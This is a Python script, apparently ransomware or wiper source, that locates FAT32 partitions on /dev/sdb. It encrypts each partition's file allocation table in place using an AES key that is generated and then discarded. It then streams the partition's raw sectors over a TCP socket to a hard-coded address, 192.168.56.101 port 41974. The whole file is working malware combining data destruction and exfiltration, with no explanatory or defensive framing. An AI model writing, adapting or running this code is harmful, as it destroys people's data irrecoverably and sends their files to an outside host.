import struct
import socket
import os
from Crypto.Cipher import AES
import time

TARGET_DISK = "/dev/sdb"
BYTE_PER_SECTOR = 512
FAT_LENGTH = -1

PARTITION_ENTRY_START = 0x1be
PARTITION_ENTRY_CNT = 4
PARTITION_ENTRY_LEN = 0x10
FAT32_LBS_PARTITION_TYPE = 0xc

IP = "192.168.56.101"
PORT = 41974

def read_disk_byte(st, s, rlen):
    with open(st, "rb") as f:
        f.seek(s)
        sector_data = f.read(rlen)
    return sector_data

def write_disk_byte(st, s, wlen, data):
    assert(len(data) == wlen)
    with open(st, "r+b") as f:
        f.seek(s)
        f.write(data)

def do_fat32_enc(disk_name, start_sector):
    fat_start, fat_length = get_fat_table_info(disk_name, start_sector)
    key = os.urandom(0x10)
    aes = AES.new(key,AES.MODE_ECB)
    for sector_index in range(fat_length):
        for block_index in range(BYTE_PER_SECTOR // 0x10):
            p_data = read_disk_byte(disk_name, (fat_start + sector_index) * BYTE_PER_SECTOR + block_index * 0x10, 0x10)
            c_data = aes.encrypt(p_data)
            write_disk_byte(disk_name, (fat_start + sector_index) * BYTE_PER_SECTOR + block_index * 0x10, 0x10, c_data)

def get_fat_table_info(disk_name, start_sector):
    vbr_data = read_disk_byte(disk_name, start_sector * BYTE_PER_SECTOR, BYTE_PER_SECTOR)
    assert(vbr_data[0x52:0x57] == b'FAT32')
    reserved_sector = struct.unpack("<H", vbr_data[0xe:0x10])[0]
    fat_cnt = vbr_data[0x10]
    assert(fat_cnt > 1)
    fat_sector = struct.unpack("<L",vbr_data[0x24:0x28])[0]
    return (start_sector + reserved_sector, fat_sector)
    

def get_fat32_partition(disk_name):
    result_list = []
    partition_table = read_disk_byte(disk_name, PARTITION_ENTRY_START, PARTITION_ENTRY_CNT * PARTITION_ENTRY_LEN)

    for i in range(PARTITION_ENTRY_CNT):
        partition_type = partition_table[PARTITION_ENTRY_LEN * i + 4]
        start_sector = struct.unpack("<L",partition_table[PARTITION_ENTRY_LEN * i + 8 :PARTITION_ENTRY_LEN * i + 12])[0]
        total_sector = struct.unpack("<L",partition_table[PARTITION_ENTRY_LEN * i + 12 :PARTITION_ENTRY_LEN * i + 16])[0]

        if partition_type == 0: continue
        if partition_type == FAT32_LBS_PARTITION_TYPE:
            result_list.append((partition_type, start_sector, total_sector))
    return result_list

def send_disk_dump(disk_name, start, total):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    for i in range(start, total):
        data = read_disk_byte(disk_name, BYTE_PER_SECTOR * i, BYTE_PER_SECTOR)
        s.send(data)
        # read done
        if len(data) != BYTE_PER_SECTOR: break
    s.close()
if __name__ == "__main__":
    fat32_partition_list = get_fat32_partition(TARGET_DISK)
    for p_type, start, total in fat32_partition_list:
        do_fat32_enc(TARGET_DISK, start) 
        send_disk_dump(TARGET_DISK, start, total)
